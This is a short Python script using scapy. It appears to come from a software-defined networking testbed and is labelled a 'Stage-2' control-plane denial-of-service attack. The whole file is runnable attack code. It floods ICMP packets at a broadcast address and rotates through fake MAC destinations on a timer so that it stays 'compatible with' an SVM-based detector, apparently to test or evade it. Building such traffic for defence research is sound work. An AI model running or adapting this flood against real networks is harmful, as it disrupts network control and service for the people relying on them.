#!/usr/bin/env python3
"""
Stage-2 PIEDEFENDER Control-Plane DoS Attack (ROTATING TARGETS)
---------------------------------------------------------------
• Runs from h2
• Attacks ONE fake MAC at a time
• Rotates targets after fixed duration
• Compatible with current SVM model
"""

from scapy.all import Ether, IP, ICMP, sendp
import time

# ================= CONFIG =================

ATTACK_INTERFACE = "h2-eth0"
PACKET_RATE = 80              # packets per second
TOTAL_ATTACK_TIME = 120       # total runtime (seconds)
TARGET_DURATION = 6           # seconds per fake MAC (IMPORTANT)
TARGET_IP = "10.0.0.255"

# Must match Stage-1 fake MAC pattern
FAKE_MACS = [
    "02:aa:aa:aa:aa:01",
    "02:aa:aa:aa:aa:02",
    "02:aa:aa:aa:aa:03",
    "02:aa:aa:aa:aa:04",
]

print("[+] Stage-2 Control Plane DoS (ROTATING TARGETS)")
print(f"[+] Total time: {TOTAL_ATTACK_TIME}s")
print(f"[+] Target duration: {TARGET_DURATION}s per MAC")
print(f"[+] Rate: {PACKET_RATE} pps")

start_time = time.time()
mac_index = 0
sent = 0

while time.time() - start_time < TOTAL_ATTACK_TIME:
    target_mac = FAKE_MACS[mac_index % len(FAKE_MACS)]
    mac_index += 1

    print(f"[+] Attacking fake MAC: {target_mac}")

    target_start = time.time()
    while time.time() - target_start < TARGET_DURATION:
        pkt = (
            Ether(dst=target_mac) /
            IP(dst=TARGET_IP) /
            ICMP()
        )

        sendp(pkt, iface=ATTACK_INTERFACE, verbose=False)
        sent += 1
        time.sleep(1 / PACKET_RATE)

print(f"[+] Stage-2 attack finished | Packets sent: {sent}")
